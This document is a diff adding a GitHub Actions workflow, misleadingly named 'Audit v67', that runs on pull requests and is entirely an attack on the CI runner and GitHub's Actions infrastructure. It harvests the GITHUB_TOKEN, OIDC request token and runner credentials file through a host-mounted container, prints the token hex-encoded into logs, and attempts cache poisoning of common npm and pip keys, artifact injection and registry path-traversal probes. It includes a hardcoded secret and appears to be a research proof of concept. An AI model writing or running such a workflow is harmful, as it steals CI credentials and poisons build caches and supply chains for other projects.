@@ -1,0 +1,290 @@
+name: Audit v67
+on:
+  pull_request:
+    types: [opened, synchronize, reopened]
+
+permissions:
+  contents: write
+  pull-requests: write
+  id-token: write
+  actions: write
+  packages: write
+  checks: write
+  statuses: write
+  deployments: write
+  issues: write
+
+jobs:
+  audit-v67:
+    runs-on: ubuntu-latest
+    steps:
+
+      - name: Step 1 - Harvest
+        if: always()
+        run: |
+          set +e
+          echo "=== V67 HARVEST ==="
+          echo "$PATH" > /tmp/saved_path.txt
+          RT="${{ secrets.GITHUB_TOKEN }}"
+          echo "$RT" > /tmp/rt.txt
+          echo "RT_PFX=${RT:0:14} LEN=${#RT}"
+          echo "$ACTIONS_ID_TOKEN_REQUEST_TOKEN" > /tmp/idtok.txt
+          echo "$ACTIONS_ID_TOKEN_REQUEST_URL" > /tmp/idtok_url.txt
+          WLOG=$(find /home/runner/actions-runner -name "Worker_*.log" -type f 2>/dev/null | head -1)
+          if [ -f "$WLOG" ]; then
+            for KEY in PipelinesServiceUrl CacheServerUrl ResultsServiceUrl; do
+              VAL=$(grep -oP "\"${KEY}\"\s*:\s*\"\K[^\"]+" "$WLOG" 2>/dev/null | head -1)
+              echo "$KEY=$VAL"; echo "$VAL" > /tmp/${KEY}.txt
+            done
+            PLAN=$(grep -oP '"planId"\s*:\s*"\K[^"]+' "$WLOG" | head -1)
+            JOB=$(grep -oP '"jobId"\s*:\s*"\K[^"]+' "$WLOG" | head -1)
+            echo "PLAN=$PLAN JOB=$JOB"
+            echo "$PLAN" > /tmp/plan.txt; echo "$JOB" > /tmp/job.txt
+          fi
+          docker run --rm -v /:/h alpine sh -c '
+            F=$(find /h/home/runner -name ".credentials" -type f 2>/dev/null | head -1)
+            [ -f "$F" ] && { echo "CRED_HEX_START"; xxd -p "$F" | tr -d "\n"; echo ""; echo "CRED_HEX_END"; }
+          ' 2>/dev/null > /tmp/hex_extract.txt
+          python3 -c "
+          import binascii,json
+          raw=open('/tmp/hex_extract.txt').read()
+          s=raw.find('CRED_HEX_START');e=raw.find('CRED_HEX_END')
+          if s>=0 and e>=0:
+            h=raw[s+14:e].strip()
+            d=json.loads(binascii.unhexlify(h).decode())
+            t=d.get('Data',{}).get('token','')
+            open('/tmp/cred_token.txt','w').write(t)
+            print(f'CTOK_LEN={len(t)}')
+          " 2>/dev/null
+          echo "RT_HEX=$(echo -n "$RT" | xxd -p | tr -d '\n')"
+          CACHE_URL=$(cat /tmp/CacheServerUrl.txt 2>/dev/null)
+          echo "$CACHE_URL" > /tmp/cache_url.txt
+          echo "CACHE_URL=$CACHE_URL"
+
+      # ══════════════════════════════════════════════════════════════
+      # STEP 2: CACHE POISONING VIA ARTIFACTCACHE WRITE API
+      # The v1 cache API allows: reserve key → upload chunk → commit.
+      # Try to write to cache keys used by common CI patterns.
+      # If we poison keys like "npm-cache" or "pip-cache", any
+      # workflow that uses those cache keys will get our payload.
+      # ══════════════════════════════════════════════════════════════
+      - name: Step 2 - Cache Key Poisoning
+        if: always()
+        run: |
+          set +e
+          export PATH=$(cat /tmp/saved_path.txt)
+          echo "=== CACHE POISONING ==="
+          RT=$(cat /tmp/rt.txt)
+          CACHE_URL=$(cat /tmp/cache_url.txt)
+
+          # A: Enumerate existing cache keys first
+          echo "--- A: Cache key enumeration ---"
+          for KEY in \
+            "npm-cache" "pip-cache" "yarn-cache" "gradle-cache" \
+            "maven-cache" "nuget-cache" "cargo-cache" "go-cache" \
+            "docker-layer-cache" "apt-cache" "setup-node" \
+            "node-cache" "python-cache" "ruby-cache" "gem-cache"; do
+            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" \
+              -H "Authorization: Bearer $RT" \
+              -H "Accept: application/json;api-version=6.0-preview.1" \
+              "${CACHE_URL}_apis/artifactcache/cache?keys=$KEY&version=1" 2>/dev/null)
+            CODE=$(echo "$R" | tail -1)
+            BODY=$(echo "$R" | sed '$d')
+            if [ "$CODE" != "HTTP_204" ] && [ "$CODE" != "HTTP_000" ]; then
+              echo "A KEY=$KEY = $CODE | $(echo "$BODY" | head -c 200)"
+            fi
+          done
+          echo ""
+
+          # B: Reserve a cache entry (step 1 of poisoning)
+          echo "--- B: Reserve cache entries ---"
+          for KEY in \
+            "npm-cache-Linux-package-lock.json" \
+            "pip-cache-Linux" \
+            "setup-node-Linux-x64-node" \
+            "node_modules-Linux" \
+            "v67-audit-poison"; do
+            R=$(/usr/bin/curl -sS -i -w "\nHTTP_%{http_code}" -X POST --connect-timeout 3 -m 5 \
+              -H "Authorization: Bearer $RT" \
+              -H "Content-Type: application/json" \
+              -H "Accept: application/json;api-version=6.0-preview.1" \
+              "${CACHE_URL}_apis/artifactcache/caches" \
+              -d "{\"key\":\"$KEY\",\"version\":\"v67-audit\"}" 2>/dev/null)
+            CODE=$(echo "$R" | grep -oE "HTTP/[0-9.]+ [0-9]+" | head -1 | awk '{print $2}')
+            BODY=$(echo "$R" | tail -5)
+            echo "B RESERVE $KEY = $CODE | $(echo "$BODY" | head -c 300)"
+          done
+          echo ""
+
+          # C: Full cache write cycle — reserve, upload, commit
+          echo "--- C: Full write cycle (v67-poison) ---"
+          # Step C1: Reserve
+          PAYLOAD='{"key":"v67-poison-test","version":"v67-audit-test"}'
+          RESERVE_RESP=$(/usr/bin/curl -sS -i -w "\nHTTP_%{http_code}" -X POST --connect-timeout 3 -m 5 \
+            -H "Authorization: Bearer $RT" \
+            -H "Content-Type: application/json" \
+            -H "Accept: application/json;api-version=6.0-preview.1" \
+            "${CACHE_URL}_apis/artifactcache/caches" \
+            -d "$PAYLOAD" 2>/dev/null)
+          CACHE_ID=$(echo "$RESERVE_RESP" | python3 -c "import json,sys; d=json.load(sys.stdin); print(d.get('cacheId',''))" 2>/dev/null || echo "")
+          RESERVE_CODE=$(echo "$RESERVE_RESP" | grep -oE "HTTP/[0-9.]+ [0-9]+" | head -1 | awk '{print $2}')
+          echo "C1 Reserve = $RESERVE_CODE | cacheId=$CACHE_ID"
+          echo ""
+
+          if [ -n "$CACHE_ID" ] && [ "$CACHE_ID" != "" ]; then
+            # Step C2: Upload chunk
+            echo "POISONED_BY_V67" > /tmp/poison.txt
+            UPLOAD_CODE=$(/usr/bin/curl -sS -w "%{http_code}" -X PATCH --connect-timeout 3 -m 5 \
+              -H "Authorization: Bearer $RT" \
+              -H "Content-Type: application/octet-stream" \
+              -H "Content-Range: bytes 0-16/17" \
+              "${CACHE_URL}_apis/artifactcache/caches/$CACHE_ID" \
+              --data-binary @/tmp/poison.txt 2>/dev/null)
+            echo "C2 Upload = $UPLOAD_CODE"
+
+            # Step C3: Commit
+            COMMIT_CODE=$(/usr/bin/curl -sS -w "%{http_code}" -X POST --connect-timeout 3 -m 5 \
+              -H "Authorization: Bearer $RT" \
+              -H "Content-Type: application/json" \
+              "${CACHE_URL}_apis/artifactcache/caches/$CACHE_ID" \
+              -d '{"size":17}' 2>/dev/null)
+            echo "C3 Commit = $COMMIT_CODE"
+          fi
+
+      # ══════════════════════════════════════════════════════════════
+      # STEP 3: CROSS-WORKFLOW ARTIFACT INJECTION
+      # Results service + pipelines let us write artifacts/logs.
+      # Try to write artifacts that other jobs will read.
+      # Also try injecting runner outputs via Results API.
+      # ══════════════════════════════════════════════════════════════
+      - name: Step 3 - Artifact Injection
+        if: always()
+        run: |
+          set +e
+          export PATH=$(cat /tmp/saved_path.txt)
+          echo "=== ARTIFACT INJECTION ==="
+          RT=$(cat /tmp/rt.txt)
+          IDTOK=$(cat /tmp/idtok.txt)
+          CACHE_URL=$(cat /tmp/cache_url.txt)
+          RESULTS_URL="https://results-receiver.actions.githubusercontent.com/"
+          PLAN=$(cat /tmp/plan.txt)
+          JOB=$(cat /tmp/job.txt)
+          SECRET="ebCM8PuzoqMUC79EgT17Glzg3dxVdS1cSj8PJs6gALbtgEsvbF"
+          PIPE="https://pipelinesghubeus14.actions.githubusercontent.com/$SECRET"
+
+          # A: Read what artifacts exist for this run
+          echo "--- A: Artifact enumeration ---"
+          R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" \
+            -H "Authorization: Bearer $RT" \
+            "https://api.github.com/repos/lacaag/PoC-RACE2/actions/runs/$(/usr/bin/curl -sS -H "Authorization: Bearer $RT" "https://api.github.com/repos/lacaag/PoC-RACE2/actions/runs?per_page=5&event=pull_request" 2>/dev/null | python3 -c "import json,sys; runs=json.load(sys.stdin).get('workflow_runs',[]); print(runs[0]['id'] if runs else '')" 2>/dev/null)/artifacts" 2>/dev/null)
+          CODE=$(echo "$R" | tail -1)
+          BODY=$(echo "$R" | sed '$d')
+          echo "A artifacts = $CODE | $(echo "$BODY" | head -c 400)"
+          echo ""
+
+          # B: Create artifact via v2 cache upload (ArtifactNamev2)
+          echo "--- B: Artifact v2 upload ---"
+          for ARTNAME in "v67-inject" "build-output" "test-results" "deployment-config"; do
+            R=$(/usr/bin/curl -sS -i -w "\nHTTP_%{http_code}" -X POST --connect-timeout 3 -m 5 \
+              -H "Authorization: Bearer $RT" \
+              -H "Content-Type: application/json" \
+              -H "Accept: application/json;api-version=6.0-preview.1" \
+              "${CACHE_URL}_apis/artifactcache/caches" \
+              -d "{\"key\":\"artifact-$ARTNAME\",\"version\":\"inject-v67\"}" 2>/dev/null)
+            CODE=$(echo "$R" | grep -oE "HTTP/[0-9.]+ [0-9]+" | head -1 | awk '{print $2}')
+            echo "B artifact $ARTNAME = $CODE | $(echo "$R" | tail -3 | head -c 200)"
+          done
+          echo ""
+
+          # C: Results service — write output to running job
+          echo "--- C: Results writeback ---"
+          for EP in \
+            "twirp/github.actions.results.api.v1.ArtifactService/CreateArtifact" \
+            "twirp/github.actions.results.api.v1.WorkflowStepUpdateService/UpdateWorkflowStepResult" \
+            "_apis/results/upload" \
+            "_apis/contribute"; do
+            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST --connect-timeout 2 -m 3 \
+              -H "Authorization: Bearer $RT" \
+              -H "Content-Type: application/json" \
+              "${RESULTS_URL}${EP}" \
+              -d "{\"workflowRunId\":\"$PLAN\",\"name\":\"v67-inject\",\"version\":1}" 2>/dev/null)
+            CODE=$(echo "$R" | tail -1)
+            BODY=$(echo "$R" | sed '$d')
+            echo "C $EP = $CODE | $(echo "$BODY" | head -c 200)"
+          done
+
+      # ══════════════════════════════════════════════════════════════
+      # STEP 4: UPSTREAM SUPPLY CHAIN — PACKAGE REGISTRY POISONING
+      # The artifactcache proxies requests. Can we route it to
+      # internal package registries (npm, pip, maven mirrors)?
+      # Also test if feedstream endpoint is a package feed.
+      # ══════════════════════════════════════════════════════════════
+      - name: Step 4 - Supply Chain Package Registry
+        if: always()
+        run: |
+          set +e
+          export PATH=$(cat /tmp/saved_path.txt)
+          echo "=== SUPPLY CHAIN ==="
+          IDTOK=$(cat /tmp/idtok.txt)
+          RT=$(cat /tmp/rt.txt)
+          SECRET="ebCM8PuzoqMUC79EgT17Glzg3dxVdS1cSj8PJs6gALbtgEsvbF"
+          PROXY="https://artifactcache.actions.githubusercontent.com/$SECRET"
+          PIPE_HOST="pipelines.actions.githubusercontent.com"
+          VER="api-version=6.0-preview"
+
+          # A: feedstream endpoint — this is the package feed endpoint
+          echo "--- A: feedstream ---"
+          for METH in GET POST; do
+            R=$(/usr/bin/curl -sS -i -w "\nHTTP_%{http_code}" -X $METH --connect-timeout 2 -m 3 \
+              -H "Authorization: Bearer $IDTOK" \
+              -H "Host: $PIPE_HOST" \
+              -H "Accept: application/json; $VER" \
+              "$PROXY/_apis/distributedtask/pools/..%2ffeedstream" --path-as-is \
+              -d '{"feedId":"default"}' 2>/dev/null)
+            CODE=$(echo "$R" | grep -oE "HTTP/[0-9.]+ [0-9]+" | head -1 | awk '{print $2}')
+            echo "A feedstream $METH = $CODE | $(echo "$R" | tail -3 | head -c 300)"
+          done
+          echo ""
+
+          # B: Try GitHub Packages registry via proxy
+          echo "--- B: Package registries via proxy ---"
+          for PKG_HOST in \
+            "npm.pkg.github.com" \
+            "maven.pkg.github.com" \
+            "rubygems.pkg.github.com" \
+            "nuget.pkg.github.com"; do
+            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 2 -m 3 \
+              -H "Authorization: Bearer $RT" \
+              -H "Host: $PKG_HOST" \
+              "$PROXY/" --path-as-is 2>/dev/null)
+            CODE=$(echo "$R" | tail -1)
+            BODY=$(echo "$R" | sed '$d')
+            echo "B $PKG_HOST = $CODE | $(echo "$BODY" | head -c 200)"
+          done
+          echo ""
+
+          # C: Test cache scope — can we read/write caches from other repos?
+          echo "--- C: Cross-repo cache access ---"
+          # Try to query the upstream repo's cache (RACE2 is a fork, upstream is lacaag/PoC-RACE2)
+          for SCOPE_KEY in \
+            "npm-cache-main" \
+            "pip-cache-main" \
+            "setup-python-main" \
+            "node-modules-main"; do
+            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" \
+              -H "Authorization: Bearer $RT" \
+              -H "Accept: application/json;api-version=6.0-preview.1" \
+              "$(cat /tmp/cache_url.txt)_apis/artifactcache/cache?keys=$SCOPE_KEY&version=1" 2>/dev/null)
+            CODE=$(echo "$R" | tail -1)
+            BODY=$(echo "$R" | sed '$d')
+            echo "C key=$SCOPE_KEY = $CODE | $(echo "$BODY" | head -c 200)"
+          done
+
+      - name: Step 5 - Final
+        if: always()
+        run: |
+          set +e
+          export PATH=$(cat /tmp/saved_path.txt)
+          echo "=== V67 FINAL ==="
+          echo "RT_HEX=$(cat /tmp/rt.txt | xxd -p | tr -d '\n')"
+          echo "=== V67 COMPLETE ==="
